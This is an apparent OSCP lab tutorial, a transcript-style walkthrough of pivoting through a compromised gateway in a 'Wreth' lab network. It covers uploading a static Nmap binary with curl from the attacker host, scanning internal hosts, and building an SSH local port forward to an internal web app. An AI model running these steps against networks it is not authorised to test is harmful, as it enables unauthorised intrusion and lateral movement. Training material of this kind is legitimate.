A **static Nmap binary** means an `nmap` executable that has been built so that most/all of its required libraries are **embedded into the binary itself**, rather than relying on libraries being installed separately on the target.

Think of it like this:

### Normal Nmap

```
nmap
 ├── needs libc
 ├── needs libssl
 ├── needs other libraries
 └── needs those libraries installed on the system
```

If you copy that Nmap binary to another Linux machine, it might fail because the required libraries aren't there or are incompatible.

### Static Nmap

```
nmap (static)
 ├── Nmap code
 ├── required libraries
 ├── dependencies
 └── everything packaged into one executable
```

### **[Part 1: Introduction to Port Forwarding, Pivoting & OSCP Requirements]**

Hello friends. So in this video, we are going to cover practical hands-on port forwarding, also known as SSH tunneling or pivoting[1]. This is a crucial and essential part of the entire OSCP course[1]. If you are taking the exam, pivoting is practically inevitable and appears in almost every exam attempt[1]. While Windows pivoting is covered in detail using tools like Chisel, Proxychains, SOCKS, and Socat in the Active Directory course, today we are focusing specifically on Linux-to-Linux port forwarding via SSH[1][2].

Chisel is an excellent cross-platform executable for both Linux and Windows[2]. However, SSH is natively available and pre-installed by default across almost all Linux distributions[2]. While Microsoft recently introduced its own port of OpenSSH for Windows, it is less common natively, making Chisel preferred for Windows, whereas SSH is ideal for Linux-to-Linux pivoting[2].

---

### **[Part 2: Lab Architecture & Network Topology]**

To demonstrate this, we are using a lab network named **Wreth**[3]. This network consists of three machines with distinct roles[3]:

1. **Outer / Gateway Host (** **10.85.5.200** **)**: Directly accessible from your attacking machine[3].
2. **First Internal Host (** **10.85.5.150** **)**: Located behind the gateway machine and protected by firewall rules[3].
3. **Deep Internal Host (** **10.85.5.100** **)**: Located behind the `.150` host[3].

Because perimeter firewall rules prevent direct connection to `.150` and `.100` from the outside, you must first compromise and gain shell access on the outer gateway machine (`.200`), and then pivot inward to reach the internal target systems[3].

---

### **[Part 3: Accessing the Gateway Host via SSH]**

We begin by establishing an SSH connection to the outer gateway machine using an SSH private key (`id_rsa`) stored in our organized workspace directory[4][5]:

```
ssh -i id_rsa root@10.85.5.200

```

Upon logging into `root@prod-server`, checking the network interfaces with `ipconfig`/`ifconfig` shows a single interface (`eth0`) with a `/24` netmask[5][6]. Although all hosts exist on the same broad network segment, strict internal firewall and port-filtering rules prevent external IP addresses from reaching the inner hosts directly[6][7]. Therefore, traffic must be routed and forwarded through this compromised gateway machine[6][7].

---

### **[Part 4: Host Enumeration via Static Nmap Binary]**

To discover active hosts on the internal network without relying on slow Bash ping loops[8], we upload a pre-compiled 64-bit static Nmap binary (`nmap`) to the target machine[9]:

```
curl http://10.8.6.2/nmap -o nmap
chmod +x nmap

```

We execute a fast Nmap ping sweep (`-sn`) across the `/24` subnet[10]:

```
./nmap -sn 10.85.5.0/24

```

The scan ignores gateway (`.1`) and broadcast (`.250`) addresses and reveals active internal hosts[11]:

- `10.85.5.100` (Host is up)[11]
- `10.85.5.150` (Host is up)[11]
- `10.85.5.200` (Current jump host)[11]

---

### **[Part 5: Port Scanning Internal Hosts]**

Next, we scan ports on the discovered internal hosts from our jump host:

1. **Scanning** **10.85.5.100**:

```
./nmap -p 0-10000 10.85.5.100

```

All ports return as filtered due to firewall restrictions[12][13].

1. **Scanning** **10.85.5.150**:

```
./nmap -p 1-100 10.85.5.150

```

Nmap discovers that **Port 80 (HTTP)** is **OPEN**[13].

Testing the web service locally from the jump host via `curl 10.85.5.150:80` succeeds and returns web server HTML[7]. However, attempting to access `10.85.5.150:80` directly from the external attacking machine fails because external traffic is blocked by firewall rules[7]. This demonstrates exactly why local port forwarding is required[7].

---

### **[Part 6: Local SSH Port Forwarding Syntax & Execution]**

SSH port forwarding includes three primary modes: **Local (** **-L** **)**, **Remote (** **-R** **)**, and **Dynamic (** **-D** **)**[14].

To perform **Local Port Forwarding**, we use the `-L` switch with the following syntax[14][15]:

```
ssh -L [LOCAL_PORT]:[REMOTE_TARGET_HOST]:[REMOTE_TARGET_PORT] -i [KEY] [USER]@[JUMP_HOST]

```

We execute the command on our local attacking machine to bind local port `8000` to port `80` on internal host `10.85.5.150` through gateway `10.85.5.200`[14][15]:

```
ssh -L 8000:10.85.5.150:80 -i id_rsa root@10.85.5.200 -f -N

```

- **-f**: Requests SSH to go to the background before command execution[15][16].
- **-N**: Instructs SSH not to execute a remote command or open an interactive shell[15][16].

_(Note: Keeping an active interactive SSH session open is often preferable to using_ _-f -N_ _, as closing the terminal window automatically terminates the background port forward without leaving stale SSH background processes running)_[16]_._

---

### **[Part 7: Verifying and Interacting with the Forwarded Service]**

With the local port forward active, any connection sent to `localhost:8000` on the local attacking machine is encapsulated through the SSH tunnel and delivered directly to `10.85.5.150:80`[15][17].

1. **CLI Verification**:

```
curl http://localhost:8000

```

This successfully returns the HTTP response from internal web host `10.85.5.150`[17].

1. **Browser Verification**: Navigating to `http://localhost:8000` in Mozilla Firefox loads the internal web application ("GetSimple CMS") directly in the browser[18].
2. **Cleanup**: To terminate the background port forward, locate the process ID using `ps aux | grep ssh` and terminate it using `kill -9 [PID]`[16][19].
